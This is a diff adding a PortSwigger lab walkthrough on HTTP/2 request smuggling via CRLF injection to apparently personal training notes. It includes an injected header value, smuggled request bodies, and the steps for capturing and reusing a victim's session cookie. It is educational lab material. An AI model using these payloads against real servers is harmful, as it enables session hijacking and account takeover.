@@ -507,6 +507,78 @@ x=1
 
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b59eb779-1305-4f65-b268-988420d01a95)
 
+**HTTP/2 request smuggling via CRLF injection**
+
+Our session cookie is tied to our search history
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/29e2adf3-ec1b-4681-b1e2-e03784bf2363)
+
+
+Removing and refreshing sessions will reset search history so our search is tied to session cookie
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4ae10be1-4f31-4a3a-8b97-82dfbf5bc69f)
+
+
+
+
+
+
+To exploit
+Add a new header using Response Headers via Inspector  should get a 404 not found 
+
+
+```
+Name 
+foo 
+Value 
+bar\r\n
+Transfer-Encoding: chunked
+```
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection> 
+
+In the body, attempt to smuggle an arbitrary prefix as follows: 
+```
+0 
+
+SMUGGLED
+```
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection> 
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6efa75ce-56ab-4b29-9d67-679150a44d46)
+
+
+
+
+
+Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix 
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection> 
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8bbc47ea-2fa6-4ec4-961f-ccf6c71de6a0)
+
+
+Change the body to the following
+
+
+```
+0
+
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Content-Length: 800
+
+search=x
+```
+
+Our get request indicate that we got the victim user session
+Copy and change our session cookie and you should have access to the user 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/35ed1968-a234-44cc-82dc-283743d82f41)
+
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f02f495a-7d6f-414e-bc7e-70e451426a2b)
+
+
 
 
 
